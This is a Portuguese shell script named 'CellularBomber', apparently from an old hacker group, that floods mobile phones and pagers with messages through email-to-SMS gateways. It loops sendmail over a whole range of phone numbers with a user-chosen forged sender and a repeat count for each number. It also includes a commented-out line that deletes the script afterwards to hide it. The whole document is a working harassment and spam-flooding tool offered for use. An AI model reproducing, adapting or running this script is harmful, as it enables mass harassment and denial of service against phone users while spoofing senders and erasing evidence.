```
#!/bin/sh
# CellularBomber para a telemoveis com endereco e-mail associado (Telecel)
# ou pagerbomber para pagers com email associado (TeleChamada), 
# ou qualquer tipo de endereco de email com parametros standart,
# por exemplo NetPac (Telepac; nopXXXXX@mail.telepac.pt)

DOMINIO="sms.telecel.pt"
CONTADOR=0
INDICATIVO="0931"

# Possibilidade de alterar o dominio e o indicativo default
if test "$1" != "" -o "$2" != "" ; then
   DOMINIO="$1"
   INDICATIVO="$2"
fi

echo -e "\n\nCellularBomber por Elektro, Kaotik Team, (elektro@null.net)"
echo "Dominio default = $DOMINIO"
echo "Indicativo default = $INDICATIVO"

# Recolha dos dados
echo -e "\nNumero do primeiro telemovel (s/ o indicativo da rede): \c"
read TEL_INI
echo -n "Numero do ultimo telemovel (s/ o indicativo da rede): "
read TEL_FINAL
echo -n "From: "
read FROM
echo -n "Nome do ficheiro contendo a mensagem: "
read FILE
echo -n "Numero de mensagens a enviar a cada utilizador: "
read NUM

# Por default o numero de mensagens e uma por utilizador
if test "$NUM" = ""; then
   NUM=1
fi

# Testa a integridade do ficheiro onde se encontra a mensagem 
# a enviar (testa se tem permissao de leitura e se existe)
if [ ! -r $FILE ]; then
   echo "O ficheiro '$FILE', nao existe."
   exit 1
fi

# Disponibiliza a opcao de enviar apenas para um telemovel,
# basta ignorar o campo do ultimo telemovel que o ciclo nao
# e afectado
if [ "$TEL_FINAL" = "" ]; then
   TEL_FINAL=$[$TEL_INI + 1]
fi

# Caso o ultimo numero seja menor, que o primeiro, ocorre
# uma troca, nao afectando o ciclo
dif=$[$TEL_INI - $TEL_FINAL]
if test "$dif" -gt 0 ; then
   temp=$TEL_FINAL
   TEL_FINAL=$TEL_INI
   TEL_INI=$temp
fi

# A variavel contador, determina no final quantos mails o
# sendmail enviou sem ocorrerem erros...
# Ou seja, em principio o destinatario existia e a mensagem
# chegou ao seu destino
while test "$TEL_INI" != "$TEL_FINAL"; do
USER="$INDICATIVO$TEL_INI"
CONTADOR2=0
while test "$CONTADOR2" != "$NUM"; do
if /usr/bin/sendmail -f $FROM "$USER"@$DOMINIO < $FILE > /dev/null ; then
   CONTADOR=$[$CONTADOR + 1]
fi
CONTADOR2=$[$CONTADOR2 + 1]
done
TEL_INI=$[$TEL_INI + 1]
done

echo "Total de $CONTADOR mensagens enviadas com sucesso!"

# :)) Opcao de 'suicidio'!
# Apaga este ficheiro apos terminar o bombing
# para fazer o enable desta opcao basta retirar o comentario
# da linha seguinte
#rm $0

exit 0
```
